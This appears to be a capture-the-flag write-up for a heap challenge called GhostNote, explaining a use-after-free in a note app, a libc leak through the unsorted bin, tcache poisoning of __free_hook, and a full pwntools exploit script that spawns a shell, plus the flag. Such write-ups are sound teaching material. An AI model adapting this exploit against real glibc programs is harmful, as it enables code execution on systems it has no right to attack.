---
title: "GhostNote"
slug: nexthunt-ghostnote
excerpt: "Heap UAF to tcache poisoning for arbitrary write"
coverImage: "https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=800"
coverImageAlt: "GhostNote - NextHunt CTF writeup"
categories:
  - NextHunt CTF
  - PWN
  - Heap
  - UAF
date: 2025-01-25
showToc: true
---

> "We created a secure note-taking application that reuses memory for efficiency. Can you exploit it?"

## Binary Analysis

```
$ checksec chall
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

All protections are enabled, but we're dealing with a heap challenge. GLIBC 2.31 uses tcache and has `__free_hook` available.

### Functionality

Classic note-taking application with 4 operations:

1. **Add Note** - Allocates a chunk (size 1-4096) and stores pointer in `notes[idx]`
2. **Delete Note** - Frees the chunk at `notes[idx]`
3. **Show Note** - Prints content of `notes[idx]`
4. **Edit Note** - Reads new content into `notes[idx]`

## Vulnerability: Use-After-Free (UAF)

In `delete_note`, the chunk is freed but the pointer is **NOT nullified**:

```c
void delete_note() {
    int idx = get_int();
    if (idx < 0 || idx > 9 || notes[idx] == NULL) {
        puts("Invalid index or empty.");
        return;
    }
    free(notes[idx]);      // Chunk is freed
    // notes[idx] = NULL;  // MISSING! This is the vulnerability
    puts("Note deleted.");
}
```

This allows us to:

- **Read freed memory** via `show_note()` - Leak heap/libc addresses
- **Write to freed memory** via `edit_note()` - Tcache poisoning

## Exploitation Strategy

### 1. Leak Libc Address

Allocate a large chunk (>0x408 bytes) that goes to unsorted bin when freed:

```python
add(2, 0x420, b'C' * 0x41f)  # Large chunk
add(3, 0x20, b'D' * 0x1f)    # Guard to prevent consolidation
delete(2)                     # Goes to unsorted bin
data = show(2)                # UAF read - leaks main_arena pointer
```

The unsorted bin fd/bk pointers point to `main_arena+96` in libc.

### 2. Tcache Poisoning

Poison tcache to allocate a chunk at `__free_hook`:

```python
add(4, 0x40, b'E' * 0x3f)
add(5, 0x40, b'F' * 0x3f)
delete(4)                     # tcache[0x50]: chunk4
delete(5)                     # tcache[0x50]: chunk5 -> chunk4

edit(5, p64(free_hook))       # UAF write - poison fd to __free_hook
                              # tcache[0x50]: chunk5 -> __free_hook

add(6, 0x40, b'/bin/sh\x00')  # Returns chunk5
add(7, 0x40, p64(system))     # Returns __free_hook, write system addr
```

### 3. Trigger Shell

```python
delete(6)  # free(chunk6) -> system("/bin/sh")
```

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Libc 2.31-0ubuntu9.17 offsets
libc_system = 0x52290
libc_free_hook = 0x1eee48

def main():
    p = remote('ctf.nexus-security.club', 2808)

    # Setup chunks
    add(p, 0, 0x80, b'A' * 0x7f)
    add(p, 1, 0x80, b'B' * 0x7f)
    delete(p, 0)

    # Leak libc via unsorted bin
    add(p, 2, 0x420, b'C' * 0x41f)
    add(p, 3, 0x20, b'D' * 0x1f)
    delete(p, 2)

    data = show(p, 2)
    leak = u64(data[:8].ljust(8, b'\x00'))
    libc_base = leak - 0x1ecbe0
    log.info(f"Libc base: {hex(libc_base)}")

    system = libc_base + libc_system
    free_hook = libc_base + libc_free_hook

    # Tcache poisoning
    add(p, 4, 0x40, b'E' * 0x3f)
    add(p, 5, 0x40, b'F' * 0x3f)
    delete(p, 4)
    delete(p, 5)

    edit(p, 5, p64(free_hook))
    add(p, 6, 0x40, b'/bin/sh\x00')
    add(p, 7, 0x40, p64(system))

    # Trigger shell
    delete(p, 6)

    p.interactive()

if __name__ == '__main__':
    main()
```

## Key Takeaways

- **Always NULL pointers after free** - The missing `notes[idx] = NULL` led to UAF
- **Unsorted bin leaks libc** - Large freed chunks have fd/bk pointing to main_arena
- **Tcache poisoning** - In GLIBC 2.31, tcache fd can be overwritten to get arbitrary allocation
- **`__free_hook`** - Classic target for code execution (removed in GLIBC 2.34+)

## Flag

```
nexus{h3ap_u4f_t0_tcache_p0is0ning_is_fun}
```
